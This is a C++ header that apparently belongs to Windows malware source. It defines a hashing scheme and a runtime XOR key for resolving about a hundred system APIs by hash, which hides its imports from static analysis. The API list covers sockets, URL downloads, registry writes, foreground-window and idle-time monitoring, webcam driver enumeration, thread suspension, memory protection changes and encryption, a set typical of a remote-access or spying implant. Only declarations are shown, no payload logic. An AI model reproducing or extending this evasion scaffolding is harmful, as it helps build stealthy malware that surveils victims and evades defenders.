#pragma once
// winsock2.h is force-included via /FI in build.bat BEFORE windows.h
// to prevent winsock.h/winsock2.h conflicts globally
#include <windows.h>
// Forward-declare HINTERNET to avoid pulling full wininet.h
typedef LPVOID HINTERNET;
#include <tlhelp32.h>
#include <objbase.h>
#include <bcrypt.h>
#include <vector>
#include <string>
#ifndef WSAAPI
#define WSAAPI __stdcall
#endif
#ifndef HASH_SEED
#define HASH_SEED 5381
#endif
namespace Resolver {
    constexpr DWORD HashString(const char* str) {
        DWORD hash = HASH_SEED;
        int c = 0;
        while (c = *str++) {
            if (c >= 'A' && c <= 'Z') c += 32;
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }
    template <DWORD V>
    struct ConstHash {
        static constexpr DWORD value = V;
    };
#define HASH_API(str) Resolver::ConstHash<Resolver::HashString(str)>::value
    extern DWORD g_runtimeXorKey;
    void InitRuntimeKeys();
    LPVOID GetAPIByHash(DWORD dllHash, DWORD funcHash);
    inline DWORD HASH_NTDLL     = HASH_API("ntdll.dll");
    inline DWORD HASH_KERNEL32  = HASH_API("kernel32.dll");
    inline DWORD HASH_KERNELBASE = HASH_API("kernelbase.dll");
    inline DWORD HASH_ADVAPI32  = HASH_API("advapi32.dll");
    inline DWORD HASH_WININET   = HASH_API("wininet.dll");
    inline DWORD HASH_CRYPT32   = HASH_API("crypt32.dll");
    inline DWORD HASH_USER32    = HASH_API("user32.dll");
    inline DWORD HASH_WS2_32    = HASH_API("ws2_32.dll");
    inline DWORD HASH_IPHLPAPI  = HASH_API("iphlpapi.dll");
    inline DWORD HASH_OLE32     = HASH_API("ole32.dll");
    inline DWORD HASH_OLEAUT32  = HASH_API("oleaut32.dll");
    inline DWORD HASH_VFW32     = HASH_API("vfw32.dll");
    inline DWORD HASH_BCRYPT    = HASH_API("bcrypt.dll");
    inline DWORD HASH_SHELL32   = HASH_API("shell32.dll");
    inline DWORD HASH_LOADLIBRARYA         = HASH_API("LoadLibraryA");
    inline DWORD HASH_GETPROCADDRESS       = HASH_API("GetProcAddress");
    inline DWORD HASH_MULTIBYTETOWIDECHAR  = HASH_API("MultiByteToWideChar");
    inline DWORD HASH_VIRTUALALLOC         = HASH_API("VirtualAlloc");
    inline DWORD HASH_VIRTUALPROTECT       = HASH_API("VirtualProtect");
    inline DWORD HASH_VIRTUALFREE          = HASH_API("VirtualFree");
    inline DWORD HASH_GETMODULEHANDLEA     = HASH_API("GetModuleHandleA");
    inline DWORD HASH_GETSYSTEMINFO        = HASH_API("GetSystemInfo");
    inline DWORD HASH_GETCOMPUTERNAMEA      = HASH_API("GetComputerNameA");
    inline DWORD HASH_GETSYSTEMDIRECTORYA   = HASH_API("GetSystemDirectoryA");
    inline DWORD HASH_GETDISKFREESPACEEXA   = HASH_API("GetDiskFreeSpaceExA");
    inline DWORD HASH_GLOBALMEMORYSTATUSEX  = HASH_API("GlobalMemoryStatusEx");
    inline DWORD HASH_GETCURRENTPROCESSID   = HASH_API("GetCurrentProcessId");
    inline DWORD HASH_GETCURRENTTHREADID    = HASH_API("GetCurrentThreadId");
    inline DWORD HASH_SETPROCESSWORKINGSETSIZE = HASH_API("SetProcessWorkingSetSize");
    inline DWORD HASH_SETTHREADEXECUTIONSTATE  = HASH_API("SetThreadExecutionState");
    inline DWORD HASH_GETTICKCOUNT           = HASH_API("GetTickCount");
    inline DWORD HASH_CREATEMUTEXA          = HASH_API("CreateMutexA");
    inline DWORD HASH_GETLASTERROR          = HASH_API("GetLastError");
    inline DWORD HASH_GETMODULEFILENAMEA    = HASH_API("GetModuleFileNameA");
    inline DWORD HASH_FILETIMETOSYSTEMTIME  = HASH_API("FileTimeToSystemTime");
    inline DWORD HASH_CREATEFILEA           = HASH_API("CreateFileA");
    inline DWORD HASH_GETFILETIME           = HASH_API("GetFileTime");
    inline DWORD HASH_CLOSEHANDLE           = HASH_API("CloseHandle");
    inline DWORD HASH_CREATETOOLHELP32SNAPSHOT = HASH_API("CreateToolhelp32Snapshot");
    inline DWORD HASH_THREAD32FIRST         = HASH_API("Thread32First");
    inline DWORD HASH_THREAD32NEXT          = HASH_API("Thread32Next");
    inline DWORD HASH_OPENTHREAD           = HASH_API("OpenThread");
    inline DWORD HASH_SUSPENDTHREAD        = HASH_API("SuspendThread");
    inline DWORD HASH_RESUMETHREAD         = HASH_API("ResumeThread");
    inline DWORD HASH_GETPROCESSHEAP       = HASH_API("GetProcessHeap");
    inline DWORD HASH_HEAPALLOC            = HASH_API("HeapAlloc");
    inline DWORD HASH_HEAPFREE             = HASH_API("HeapFree");
    inline DWORD HASH_CREATEFILEMAPPINGA    = HASH_API("CreateFileMappingA");
    inline DWORD HASH_MAPVIEWOFFILE         = HASH_API("MapViewOfFile");
    inline DWORD HASH_UNMAPVIEWOFFILE       = HASH_API("UnmapViewOfFile");
    inline DWORD HASH_GETUSERNAMEA         = HASH_API("GetUserNameA");
    inline DWORD HASH_REGCREATEKEYEXA      = HASH_API("RegCreateKeyExA");
    inline DWORD HASH_REGSETVALUEEXA       = HASH_API("RegSetValueExA");
    inline DWORD HASH_REGOPENKEYEXA        = HASH_API("RegOpenKeyExA");
    inline DWORD HASH_REGQUERYVALUEEXA     = HASH_API("RegQueryValueExA");
    inline DWORD HASH_REGCLOSEKEY          = HASH_API("RegCloseKey");
    inline DWORD HASH_OPENPROCESSTOKEN     = HASH_API("OpenProcessToken");
    inline DWORD HASH_GETTOKENINFORMATION  = HASH_API("GetTokenInformation");
    inline DWORD HASH_GETFOREGROUNDWINDOW  = HASH_API("GetForegroundWindow");
    inline DWORD HASH_GETWINDOWTEXTA       = HASH_API("GetWindowTextA");
    inline DWORD HASH_GETLASTINPUTINFO     = HASH_API("GetLastInputInfo");
    inline DWORD HASH_ENUMDISPLAYDEVICESA  = HASH_API("EnumDisplayDevicesA");
    inline DWORD HASH_WSASTARTUP           = HASH_API("WSAStartup");
    inline DWORD HASH_WSACLEANUP           = HASH_API("WSACleanup");
    inline DWORD HASH_SOCKET               = HASH_API("socket");
    inline DWORD HASH_CONNECT              = HASH_API("connect");
    inline DWORD HASH_SEND                 = HASH_API("send");
    inline DWORD HASH_RECV                 = HASH_API("recv");
    inline DWORD HASH_CLOSESOCKET          = HASH_API("closesocket");
    inline DWORD HASH_GETADDRINFO          = HASH_API("getaddrinfo");
    inline DWORD HASH_FREEADDRINFO         = HASH_API("freeaddrinfo");
    inline DWORD HASH_SETSOCKOPT           = HASH_API("setsockopt");
    inline DWORD HASH_INTERNETOPENA        = HASH_API("InternetOpenA");
    inline DWORD HASH_INTERNETOPENURLA     = HASH_API("InternetOpenUrlA");
    inline DWORD HASH_INTERNETREADFILE     = HASH_API("InternetReadFile");
    inline DWORD HASH_INTERNETCLOSEHANDLE  = HASH_API("InternetCloseHandle");
    inline DWORD HASH_CRYPTSTRINGTOBINARYA = HASH_API("CryptStringToBinaryA");
    inline DWORD HASH_BCRYPTOPENALGORITHMPROVIDER   = HASH_API("BCryptOpenAlgorithmProvider");
    inline DWORD HASH_BCRYPTGETPROPERTY             = HASH_API("BCryptGetProperty");
    inline DWORD HASH_BCRYPTCREATEHASH              = HASH_API("BCryptCreateHash");
    inline DWORD HASH_BCRYPTHASHDATA                = HASH_API("BCryptHashData");
    inline DWORD HASH_BCRYPTFINISHHASH              = HASH_API("BCryptFinishHash");
    inline DWORD HASH_BCRYPTDESTROYHASH             = HASH_API("BCryptDestroyHash");
    inline DWORD HASH_BCRYPTCLOSEALGORITHMPROVIDER  = HASH_API("BCryptCloseAlgorithmProvider");
    inline DWORD HASH_BCRYPTGENRANDOM               = HASH_API("BCryptGenRandom");
    inline DWORD HASH_BCRYPTSETPROPERTY             = HASH_API("BCryptSetProperty");
    inline DWORD HASH_BCRYPTGENERATESYMMETRICKEY    = HASH_API("BCryptGenerateSymmetricKey");
    inline DWORD HASH_BCRYPTENCRYPT                 = HASH_API("BCryptEncrypt");
    inline DWORD HASH_BCRYPTDECRYPT                 = HASH_API("BCryptDecrypt");
    inline DWORD HASH_BCRYPTDESTROYKEY              = HASH_API("BCryptDestroyKey");
    inline DWORD HASH_COINITIALIZEEX       = HASH_API("CoInitializeEx");
    inline DWORD HASH_COINITIALIZESECURITY = HASH_API("CoInitializeSecurity");
    inline DWORD HASH_COCREATEINSTANCE     = HASH_API("CoCreateInstance");
    inline DWORD HASH_COUNINITIALIZE       = HASH_API("CoUninitialize");
    inline DWORD HASH_VARIANTCLEAR         = HASH_API("VariantClear");
    inline DWORD HASH_CAPGETDRIVERDESCRIPTIONA = HASH_API("capGetDriverDescriptionA");
    inline DWORD HASH_ISUSERANADMIN        = HASH_API("IsUserAnAdmin");
    typedef HMODULE (WINAPI* LoadLibraryA_t)(LPCSTR);
    typedef FARPROC (WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
    typedef int (WINAPI* MultiByteToWideChar_t)(UINT, DWORD, LPCCH, int, LPWSTR, int);
    typedef LPVOID (WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef BOOL (WINAPI* VirtualFree_t)(LPVOID, SIZE_T, DWORD);
    typedef HMODULE (WINAPI* GetModuleHandleA_t)(LPCSTR);
    typedef void (WINAPI* GetSystemInfo_t)(LPSYSTEM_INFO);
    typedef BOOL (WINAPI* GetComputerNameA_t)(LPSTR, LPDWORD);
    typedef UINT (WINAPI* GetSystemDirectoryA_t)(LPSTR, UINT);
    typedef BOOL (WINAPI* GetDiskFreeSpaceExA_t)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
    typedef BOOL (WINAPI* GlobalMemoryStatusEx_t)(LPMEMORYSTATUSEX);
    typedef DWORD (WINAPI* GetCurrentProcessId_t)();
    typedef DWORD (WINAPI* GetCurrentThreadId_t)();
    typedef BOOL (WINAPI* SetProcessWorkingSetSize_t)(HANDLE, SIZE_T, SIZE_T);
    typedef EXECUTION_STATE (WINAPI* SetThreadExecutionState_t)(EXECUTION_STATE);
    typedef DWORD (WINAPI* GetTickCount_t)();
    typedef HANDLE (WINAPI* CreateMutexA_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
    typedef DWORD (WINAPI* GetLastError_t)();
    typedef DWORD (WINAPI* GetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
    typedef BOOL (WINAPI* FileTimeToSystemTime_t)(const FILETIME*, LPSYSTEMTIME);
    typedef HANDLE (WINAPI* CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL (WINAPI* GetFileTime_t)(HANDLE, LPFILETIME, LPFILETIME, LPFILETIME);
    typedef BOOL (WINAPI* CloseHandle_t)(HANDLE);
    typedef HANDLE (WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
    typedef BOOL (WINAPI* Thread32First_t)(HANDLE, LPTHREADENTRY32);
    typedef BOOL (WINAPI* Thread32Next_t)(HANDLE, LPTHREADENTRY32);
    typedef HANDLE (WINAPI* OpenThread_t)(DWORD, BOOL, DWORD);
    typedef DWORD (WINAPI* SuspendThread_t)(HANDLE);
    typedef DWORD (WINAPI* ResumeThread_t)(HANDLE);
    typedef HANDLE (WINAPI* GetProcessHeap_t)();
    typedef LPVOID (WINAPI* HeapAlloc_t)(HANDLE, DWORD, SIZE_T);
    typedef BOOL (WINAPI* HeapFree_t)(HANDLE, DWORD, LPVOID);
    typedef HANDLE (WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
    typedef LPVOID (WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
    typedef BOOL (WINAPI* UnmapViewOfFile_t)(LPCVOID);
    typedef BOOL (WINAPI* GetUserNameA_t)(LPSTR, LPDWORD);
    typedef LSTATUS (WINAPI* RegCreateKeyExA_t)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
    typedef LSTATUS (WINAPI* RegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LSTATUS (WINAPI* RegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS (WINAPI* RegQueryValueExA_t)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef LSTATUS (WINAPI* RegCloseKey_t)(HKEY);
    typedef BOOL (WINAPI* OpenProcessToken_t)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI* GetTokenInformation_t)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
    typedef HWND (WINAPI* GetForegroundWindow_t)();
    typedef int (WINAPI* GetWindowTextA_t)(HWND, LPSTR, int);
    typedef BOOL (WINAPI* GetLastInputInfo_t)(PLASTINPUTINFO);
    typedef BOOL (WINAPI* EnumDisplayDevicesA_t)(LPCSTR, DWORD, PDISPLAY_DEVICEA, DWORD);
    typedef int (WSAAPI* WSAStartup_t)(WORD, LPWSADATA);
    typedef int (WSAAPI* WSACleanup_t)();
    typedef SOCKET (WSAAPI* socket_t)(int, int, int);
    typedef int (WSAAPI* connect_t)(SOCKET, const struct sockaddr*, int);
    typedef int (WSAAPI* send_t)(SOCKET, const char*, int, int);
    typedef int (WSAAPI* recv_t)(SOCKET, char*, int, int);
    typedef int (WSAAPI* closesocket_t)(SOCKET);
    typedef int (WSAAPI* getaddrinfo_t)(PCSTR, PCSTR, const struct addrinfo*, struct addrinfo**);
    typedef void (WSAAPI* freeaddrinfo_t)(struct addrinfo*);
    typedef int (WSAAPI* setsockopt_t)(SOCKET, int, int, const char*, int);
    typedef HINTERNET (WINAPI* InternetOpenA_t)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    typedef HINTERNET (WINAPI* InternetOpenUrlA_t)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI* InternetReadFile_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI* InternetCloseHandle_t)(HINTERNET);
    typedef BOOL (WINAPI* CryptStringToBinaryA_t)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
    typedef NTSTATUS (WINAPI* BCryptOpenAlgorithmProvider_t)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
    typedef NTSTATUS (WINAPI* BCryptGetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
    typedef NTSTATUS (WINAPI* BCryptCreateHash_t)(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptHashData_t)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptFinishHash_t)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptDestroyHash_t)(BCRYPT_HASH_HANDLE);
    typedef NTSTATUS (WINAPI* BCryptCloseAlgorithmProvider_t)(BCRYPT_ALG_HANDLE, ULONG);
    typedef NTSTATUS (WINAPI* BCryptGenRandom_t)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptSetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptGenerateSymmetricKey_t)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptEncrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
    typedef NTSTATUS (WINAPI* BCryptDecrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
    typedef NTSTATUS (WINAPI* BCryptDestroyKey_t)(BCRYPT_KEY_HANDLE);
    typedef HRESULT (WINAPI* CoInitializeEx_t)(LPVOID, DWORD);
    typedef HRESULT (WINAPI* CoInitializeSecurity_t)(PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void*);
    typedef HRESULT (WINAPI* CoCreateInstance_t)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
    typedef void (WINAPI* CoUninitialize_t)();
    typedef void (WINAPI* VariantClear_t)(VARIANTARG*);
    typedef BOOL (WINAPI* capGetDriverDescriptionA_t)(WORD, LPSTR, int, LPSTR, int);
    typedef BOOL (WINAPI* IsUserAnAdmin_t)();
}
